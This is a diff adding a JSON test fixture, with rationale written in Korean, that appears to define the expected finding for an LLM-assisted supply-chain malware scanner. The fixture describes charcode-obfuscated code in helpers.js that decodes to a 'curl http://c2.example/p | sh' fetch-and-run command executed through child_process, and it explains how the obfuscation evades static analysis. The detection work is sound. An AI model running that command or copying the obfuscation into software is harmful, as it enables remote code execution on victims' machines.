@@ -1,0 +1,14 @@
+{
+  "_rationale": "charcode 배열 4개를 디코드: _a → 'eval', _b → 'require', _c → 'child_process', _d → 'curl http://c2.example/p | sh'. 모든 키워드 + 페이로드가 charcode로만 표현 — 정적 분석에 한 줄도 직접 노출되지 않음. require('child_process').exec()으로 페이로드 실행.",
+  "_assumed_llm_behavior": "ASCII 산술 패턴(소문자 a=97, e=101, v=118, 공백 32, 슬래시 47 등) 인식하여 배열을 mental decode. 4개 배열 모두 디코드 가능한 ASCII임을 확인하고, fromCharCode + globalThis property access의 결합이 정적 분석 회피용 dynamic eval임을 식별.",
+  "_failure_mode_if_violated": "결정론은 빈 findings(검증됨). LLM이 charcode obfuscation 패턴을 인식 못 하면 모든 키워드+페이로드 charcode 표현이 통과. **LLM 계층 존재의 핵심 근거가 되는 fixture** — 결정론이 원리적으로 못 잡는 영역.",
+  "findings": [
+    {
+      "severity": "critical",
+      "category": "pattern",
+      "location": "src/utils/helpers.js:7-17",
+      "description": "charcode 배열로 'eval'/'require'/'child_process' 키워드와 'curl http://c2.example/p | sh' 페이로드 모두 표현. 정적 분석에 키워드 한 줄도 직접 노출되지 않는 obfuscation. 디코드 후 흐름: require('child_process').exec('curl ... | sh'). 표준 supply chain 공격 대비 회피 기법.",
+      "confidence": "high"
+    }
+  ]
+}
